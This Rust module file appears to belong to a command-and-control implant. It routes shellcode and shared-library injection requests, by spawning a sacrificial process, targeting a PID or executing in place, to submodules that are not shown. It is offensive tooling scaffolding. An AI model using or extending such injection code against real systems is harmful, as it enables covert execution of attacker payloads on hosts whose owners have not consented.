//! Process injection: shellcode, shared library (.so), and spawn-inject.

mod dll;
mod dlopen;
mod ptrace;
mod shellcode;

use crate::command::PhantomState;
use crate::error::PhantomError;

// Re-export items consumed by command/mod.rs tests.
#[cfg(test)]
pub(super) use dlopen::{find_libc_base, resolve_dlopen_in_target};
#[cfg(test)]
pub(super) use ptrace::check_ptrace_permission;
#[cfg(test)]
pub(super) use ptrace::read_from_proc_mem;

/// Injection way: spawn a new sacrificial process and inject into it.
const INJECT_WAY_SPAWN: i32 = 0;
/// Injection way: inject into an existing process by PID.
pub(super) const INJECT_WAY_INJECT: i32 = 1;
/// Injection way: execute in the current process.
pub(super) const INJECT_WAY_EXECUTE: i32 = 2;

/// Injection result: success.
pub(super) const INJECT_ERROR_SUCCESS: u32 = 0;
/// Injection result: generic failure.
pub(super) const INJECT_ERROR_FAILED: u32 = 1;

pub(super) async fn execute_inject_shellcode(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    shellcode::execute_inject_shellcode(request_id, payload, state).await
}

pub(super) async fn execute_inject_dll(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    dll::execute_inject_dll(request_id, payload, state).await
}

pub(super) async fn execute_spawn_dll(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    dll::execute_spawn_dll(request_id, payload, state).await
}
